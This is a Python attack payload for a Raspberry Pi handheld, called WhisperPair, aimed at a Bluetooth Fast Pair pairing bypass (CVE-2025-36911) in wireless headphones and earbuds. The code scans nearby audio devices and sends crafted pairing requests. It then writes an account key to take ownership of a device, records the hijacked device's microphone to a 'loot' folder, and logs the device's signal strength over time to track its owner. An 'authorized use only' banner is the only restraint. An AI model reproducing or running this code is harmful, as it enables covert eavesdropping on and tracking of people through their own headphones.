#!/usr/bin/env python3
"""
RaspyJack Payload -- WhisperPair (CVE-2025-36911)
====================================================
Author: 7h30th3r0n3

Demonstrates the Fast Pair pairing mode bypass vulnerability.
Scans for vulnerable Bluetooth audio devices and tests if they
accept pairing requests outside of pairing mode.

AUTHORIZED TESTING ONLY — only test devices you own.

Views (KEY1 to cycle):
  SCAN     Discover nearby BLE audio devices
  RESULTS  Vulnerable / not vulnerable results

Controls:
  OK         Start scan / Test selected device
  KEY1       Cycle views
  UP/DOWN    Navigate device list
  KEY3       Exit
"""

import os
import sys
import time
import asyncio
import threading
import random

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from bleak import BleakClient, BleakScanner
    BLEAK_OK = True
except ImportError:
    BLEAK_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LCD = None

# Fast Pair GATT UUIDs
FP_SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
FP_KEYPAIR_UUID = "fe2c1234-8366-4814-8eb0-01de32100bea"
FP_ACCOUNT_KEY_UUID = "fe2c1235-8366-4814-8eb0-01de32100bea"

# Audio GATT (A2DP/HFP over BLE)
LOOT_DIR = "/root/Raspyjack/loot/WhisperPair"

# Known Fast Pair device name keywords
FP_KEYWORDS = [
    "sony", "jbl", "beats", "pixel", "galaxy", "buds",
    "bose", "jabra", "nothing", "earbuds", "airpods",
    "soundcore", "anker", "marshall", "sennheiser",
    "wh-1000", "wf-1000", "flip", "charge", "pulse",
    "tune", "live", "reflect", "endurance", "club",
]

VIEWS = ["SCAN", "RESULTS"]
ACTIONS = ["test", "exploit", "record", "track"]
action_idx = 0

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
lock = threading.Lock()
devices_found = []      # [{address, name, rssi}]
test_results = []       # [{address, name, vulnerable, error}]
scanning = False
testing = False
status_msg = "Ready"
cursor = 0
view_idx = 0
scroll = 0


# ---------------------------------------------------------------------------
# BLE scanning
# ---------------------------------------------------------------------------


async def _scan_ble(duration=8):
    """Scan for BLE devices that might support Fast Pair."""
    found = []
    try:
        discovered = await BleakScanner.discover(timeout=duration)
        for d in discovered:
            name = d.name or ""
            # Check if device name matches known audio brands
            name_lower = name.lower()
            is_audio = any(kw in name_lower for kw in FP_KEYWORDS)
            # Also include devices advertising FE2C service
            uuids = [str(u).lower() for u in (d.metadata.get("uuids", []) or [])]
            has_fp = any("fe2c" in u for u in uuids)

            if is_audio or has_fp or not name:
                found.append({
                    "address": d.address,
                    "name": name or d.address[-8:],
                    "rssi": d.rssi or -99,
                    "has_fp_uuid": has_fp,
                })
    except Exception as e:
        with lock:
            global status_msg
            status_msg = f"Scan err: {str(e)[:20]}"
    return found


def _scan_thread():
    """Background scan thread."""
    global scanning, devices_found, status_msg
    with lock:
        scanning = True
        status_msg = "Scanning..."

    try:
        loop = asyncio.new_event_loop()
        found = loop.run_until_complete(_scan_ble())
        loop.close()
        found.sort(key=lambda d: d["rssi"], reverse=True)
        with lock:
            devices_found = found
            status_msg = f"Found {len(found)} devices"
    except Exception as e:
        with lock:
            status_msg = f"Error: {str(e)[:20]}"
    finally:
        with lock:
            scanning = False


# ---------------------------------------------------------------------------
# WhisperPair test (CVE-2025-36911)
# ---------------------------------------------------------------------------


async def _test_device(address):
    """Test if a device accepts Fast Pair requests outside pairing mode."""
    try:
        async with BleakClient(address, timeout=10) as client:
            if not client.is_connected:
                return "fail", "Connect failed"

            fp_service = None
            for s in client.services:
                if s.uuid.lower() == FP_SERVICE_UUID:
                    fp_service = s
                    break
            if not fp_service:
                return "safe", "No FP service"

            fp_char = None
            for c in fp_service.characteristics:
                if c.uuid.lower() == FP_KEYPAIR_UUID:
                    fp_char = c
                    break
            if not fp_char:
                return "safe", "No FP char"

            provider_addr = bytes.fromhex(address.replace(":", "").replace("-", ""))
            salt = os.urandom(8)
            raw_request = bytes([0x00, 0x11]) + provider_addr + salt

            try:
                await client.write_gatt_char(fp_char, raw_request, response=True)
                return "vuln", "VULNERABLE"
            except Exception:
                return "safe", "Rejected"

    except asyncio.TimeoutError:
        return "fail", "Timeout"
    except Exception as e:
        return "fail", str(e)[:25]


async def _exploit_device(address):
    """Full exploit chain: bypass → pair → write account key → establish ownership.

    After the initial Key-based Pairing bypass succeeds, we:
    1. Complete the BT pairing via standard mechanism
    2. Write an Account Key to claim ownership
    3. The device now trusts us as the owner
    """
    try:
        async with BleakClient(address, timeout=15) as client:
            if not client.is_connected:
                return "fail", "Connect failed"

            # Step 1: Key-based pairing bypass
            fp_char = None
            for s in client.services:
                if s.uuid.lower() == FP_SERVICE_UUID:
                    for c in s.characteristics:
                        if c.uuid.lower() == FP_KEYPAIR_UUID:
                            fp_char = c
                            break

            if not fp_char:
                return "fail", "No FP service"

            provider_addr = bytes.fromhex(address.replace(":", "").replace("-", ""))
            salt = os.urandom(8)
            raw_request = bytes([0x00, 0x11]) + provider_addr + salt

            try:
                await client.write_gatt_char(fp_char, raw_request, response=True)
            except Exception:
                return "safe", "Bypass rejected"

            # Step 2: Pair via standard BLE (device now accepts because bypass succeeded)
            try:
                await client.pair()
            except Exception:
                pass  # Some devices auto-pair after bypass

            # Step 3: Write Account Key (claim ownership)
            account_key = os.urandom(16)  # Random 16-byte account key
            ak_char = None
            for s in client.services:
                if s.uuid.lower() == FP_SERVICE_UUID:
                    for c in s.characteristics:
                        if c.uuid.lower() == FP_ACCOUNT_KEY_UUID:
                            ak_char = c
                            break

            if ak_char:
                try:
                    await client.write_gatt_char(ak_char, account_key, response=True)
                    return "owned", "PAIRED+KEY"
                except Exception:
                    return "vuln", "Paired, no key"
            else:
                return "vuln", "Paired, no AK char"

    except Exception as e:
        return "fail", str(e)[:25]


def _start_audio_record(address):
    """Record audio from hijacked device via bluetoothctl + parecord.

    After exploit, the device appears as a paired audio device.
    We use PulseAudio/PipeWire to capture the microphone stream.
    """
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    safe_addr = address.replace(":", "")
    wav_path = os.path.join(LOOT_DIR, f"whisper_{safe_addr}_{ts}.wav")

    # Connect audio profile via bluetoothctl
    import subprocess
    subprocess.run(["bluetoothctl", "connect", address],
                   capture_output=True, timeout=10)
    time.sleep(2)

    # Record via parecord (PulseAudio) or arecord (ALSA fallback)
    try:
        proc = subprocess.Popen(
            ["parecord", "--file-format=wav", wav_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return proc, wav_path
    except FileNotFoundError:
        try:
            proc = subprocess.Popen(
                ["arecord", "-f", "S16_LE", "-r", "16000", "-c", "1", wav_path],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return proc, wav_path
        except FileNotFoundError:
            return None, None


def _stop_audio_record(proc):
    """Stop recording."""
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


def _track_device(address, name):
    """Track a device's presence over time. Saves RSSI readings to loot."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    safe_addr = address.replace(":", "")
    track_path = os.path.join(LOOT_DIR, f"track_{safe_addr}.csv")

    # Write header if new file
    if not os.path.exists(track_path):
        with open(track_path, "w") as f:
            f.write("timestamp,address,name,rssi,seen\n")

    while tracking_active:
        try:
            loop = asyncio.new_event_loop()
            discovered = loop.run_until_complete(
                BleakScanner.discover(timeout=3))
            loop.close()

            found = False
            for d in discovered:
                if d.address.upper() == address.upper():
                    found = True
                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
                    with open(track_path, "a") as f:
                        f.write(f"{ts},{address},{name},{d.rssi},1\n")
                    with lock:
                        global status_msg
                        status_msg = f"Track: {name[:10]} {d.rssi}dBm"
                    break

            if not found:
                ts = time.strftime("%Y-%m-%d %H:%M:%S")
                with open(track_path, "a") as f:
                    f.write(f"{ts},{address},{name},,0\n")
                with lock:
                    status_msg = f"Track: {name[:10]} LOST"

        except Exception:
            pass
        time.sleep(5)


# Action thread
tracking_active = False
recording_proc = None
recording_path = None


def _action_thread(device, action):
    """Background thread for test/exploit/record/track."""
    global testing, status_msg, tracking_active, recording_proc, recording_path
    with lock:
        testing = True
        status_msg = f"{action}: {device['name'][:10]}..."

    try:
        loop = asyncio.new_event_loop()

        if action == "test":
            result_status, msg = loop.run_until_complete(
                _test_device(device["address"]))
        elif action == "exploit":
            result_status, msg = loop.run_until_complete(
                _exploit_device(device["address"]))
        elif action == "record":
            # Exploit first, then record
            result_status, msg = loop.run_until_complete(
                _exploit_device(device["address"]))
            if result_status in ("vuln", "owned"):
                recording_proc, recording_path = _start_audio_record(
                    device["address"])
                if recording_proc:
                    msg = f"REC: {os.path.basename(recording_path or '')[:15]}"
                    result_status = "recording"
                else:
                    msg = "No audio sink"
        elif action == "track":
            tracking_active = True
            threading.Thread(target=_track_device,
                             args=(device["address"], device["name"]),
                             daemon=True).start()
            result_status = "tracking"
            msg = "Tracking started"

        loop.close()

        result = {
            "address": device["address"],
            "name": device["name"],
            "status": result_status,
            "msg": msg,
        }
        with lock:
            existing = [r for r in test_results if r["address"] == device["address"]]
            if existing:
                existing[0].update(result)
            else:
                test_results.append(result)
            status_msg = f"{msg}"

    except Exception as e:
        with lock:
            status_msg = f"Error: {str(e)[:18]}"
    finally:
        with lock:
            testing = False


# ---------------------------------------------------------------------------
# LCD Drawing
# ---------------------------------------------------------------------------


def _draw_scan(lcd, font, font_sm):
    img = Image.new("RGB", (WIDTH, HEIGHT), "#000000")
    d = ScaledDraw(img)

    with lock:
        devs = list(devices_found)
        is_scanning = scanning
        is_testing = testing
        msg = status_msg
        cur = cursor

    act = ACTIONS[action_idx]
    act_colors = {"test": "#FFAA00", "exploit": "#FF3333",
                  "record": "#FF0066", "track": "#00CCFF"}

    # Header
    d.rectangle((0, 0, 127, 12), fill="#0a0a14")
    d.text((2, 1), "WHISPERPAIR", font=font_sm, fill="#FF6600")
    d.text((85, 1), act.upper(), font=font_sm, fill=act_colors.get(act, "#888"))

    # Status
    d.text((2, 14), msg[:22], font=font_sm,
           fill="#FFAA00" if is_scanning or is_testing else "#888")

    if not devs:
        if is_scanning:
            d.text((20, 55), "Scanning...", font=font_sm, fill="#FFAA00")
        else:
            d.text((10, 40), "OK = Start scan", font=font_sm, fill="#666")
            d.text((10, 55), "L/R = Change action", font=font_sm, fill="#444")
            d.text((10, 70), f"Mode: {act}", font=font_sm, fill=act_colors.get(act))
    else:
        d.line([(0, 25), (127, 25)], fill="#333")
        y = 27
        visible = devs[scroll:scroll + 6]
        for i, dev in enumerate(visible):
            idx = scroll + i
            selected = idx == cur
            bg = "#0a1a0a" if selected else "#000"
            d.rectangle((0, y, 127, y + 13), fill=bg)

            name = dev["name"][:12]
            rssi = dev["rssi"]
            fp = "*" if dev.get("has_fp_uuid") else " "

            # Check result status
            tested = [r for r in test_results if r["address"] == dev["address"]]
            if tested:
                st = tested[0].get("status", "")
                if st == "owned":
                    name_col = "#FF0066"
                    indicator = "!"
                elif st == "vuln":
                    name_col = "#FF3333"
                    indicator = "V"
                elif st == "recording":
                    name_col = "#FF0066"
                    indicator = "R"
                elif st == "tracking":
                    name_col = "#00CCFF"
                    indicator = "T"
                elif st == "safe":
                    name_col = "#00FF00"
                    indicator = "."
                else:
                    name_col = "#888"
                    indicator = "?"
            else:
                indicator = fp
                name_col = "#FFF" if selected else "#CCC"

            d.text((2, y + 1), indicator, font=font_sm, fill=name_col)
            d.text((10, y + 1), name, font=font_sm, fill=name_col)
            d.text((95, y + 1), f"{rssi}", font=font_sm, fill="#888")
            y += 14

    d.rectangle((0, 116, 127, 127), fill="#0a0a14")
    if devs and not is_scanning:
        d.text((2, 117), f"OK:{act} L/R:mode K1:Vw", font=font_sm, fill="#666")
    else:
        d.text((2, 117), "OK:Scan L/R:mode K3:X", font=font_sm, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)


def _draw_results(lcd, font, font_sm):
    img = Image.new("RGB", (WIDTH, HEIGHT), "#000000")
    d = ScaledDraw(img)

    with lock:
        results = list(test_results)

    # Header
    d.rectangle((0, 0, 127, 12), fill="#0a0a14")
    d.text((2, 1), "RESULTS", font=font_sm, fill="#FF6600")
    vuln_count = sum(1 for r in results if r.get("status") in ("vuln", "owned", "recording"))
    d.text((70, 1), f"V:{vuln_count}/{len(results)}", font=font_sm,
           fill="#FF3333" if vuln_count else "#00FF00")

    if not results:
        d.text((15, 50), "No tests yet", font=font_sm, fill="#666")
        d.text((10, 65), "Scan then test", font=font_sm, fill="#444")
    else:
        y = 16
        for r in results[:7]:
            name = r["name"][:11]
            st = r.get("status", "")
            msg = r.get("msg", "")[:8]

            status_colors = {
                "vuln": ("#FF3333", "VULN"),
                "owned": ("#FF0066", "OWNED"),
                "recording": ("#FF0066", "REC"),
                "tracking": ("#00CCFF", "TRACK"),
                "safe": ("#00FF00", "SAFE"),
                "fail": ("#888", "FAIL"),
            }
            color, label = status_colors.get(st, ("#888", st[:5].upper()))

            if st in ("vuln", "owned", "recording"):
                d.rectangle((0, y, 127, y + 13), fill="#1a0808")
            d.text((2, y + 1), label, font=font_sm, fill=color)
            d.text((35, y + 1), name, font=font_sm, fill="#CCC")
            d.text((95, y + 1), msg, font=font_sm, fill="#555")
            y += 14

    d.rectangle((0, 116, 127, 127), fill="#0a0a14")
    d.text((2, 117), "K1:View K3:Exit", font=font_sm, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main():
    global LCD, cursor, view_idx, scroll, action_idx, tracking_active, recording_proc

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    LCD.LCD_Clear()
    font = scaled_font(10)
    font_sm = scaled_font(8)

    if not BLEAK_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "#000")
        d = ScaledDraw(img)
        d.text((4, 40), "bleak not found!", font=font, fill="#FF4444")
        d.text((4, 60), "pip3 install bleak", font=font_sm, fill="#888")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "#000")
    d = ScaledDraw(img)
    d.text((64, 20), "WHISPER", font=font, fill="#FF6600", anchor="mm")
    d.text((64, 35), "PAIR", font=font, fill="#FF6600", anchor="mm")
    d.line([(20, 45), (108, 45)], fill="#333")
    d.text((64, 55), "CVE-2025-36911", font=font_sm, fill="#FF3333", anchor="mm")
    d.text((64, 70), "Fast Pair Bypass", font=font_sm, fill="#888", anchor="mm")
    d.text((64, 85), "Audio Device Hijack", font=font_sm, fill="#888", anchor="mm")
    d.text((64, 105), "AUTHORIZED USE ONLY", font=font_sm, fill="#FF4444", anchor="mm")
    LCD.LCD_ShowImage(img, 0, 0)

    time.sleep(0.5)
    while get_button(PINS, GPIO) is not None:
        time.sleep(0.05)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                with lock:
                    is_busy = scanning or testing
                if not is_busy:
                    if not devices_found:
                        threading.Thread(target=_scan_thread, daemon=True).start()
                    elif cursor < len(devices_found):
                        dev = devices_found[cursor]
                        act = ACTIONS[action_idx]
                        threading.Thread(target=_action_thread,
                                        args=(dev, act), daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY1":
                view_idx = (view_idx + 1) % len(VIEWS)
                time.sleep(0.2)

            elif btn == "LEFT":
                action_idx = (action_idx - 1) % len(ACTIONS)
                time.sleep(0.2)

            elif btn == "RIGHT":
                action_idx = (action_idx + 1) % len(ACTIONS)
                time.sleep(0.2)

            elif btn == "UP":
                cursor = max(0, cursor - 1)
                if cursor < scroll:
                    scroll = cursor
                time.sleep(0.12)

            elif btn == "DOWN":
                with lock:
                    max_c = max(0, len(devices_found) - 1)
                cursor = min(max_c, cursor + 1)
                if cursor >= scroll + 6:
                    scroll = cursor - 5
                time.sleep(0.12)

            view = VIEWS[view_idx]
            if view == "SCAN":
                _draw_scan(LCD, font, font_sm)
            elif view == "RESULTS":
                _draw_results(LCD, font, font_sm)

            time.sleep(0.05)

    finally:
        tracking_active = False
        _stop_audio_record(recording_proc)
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
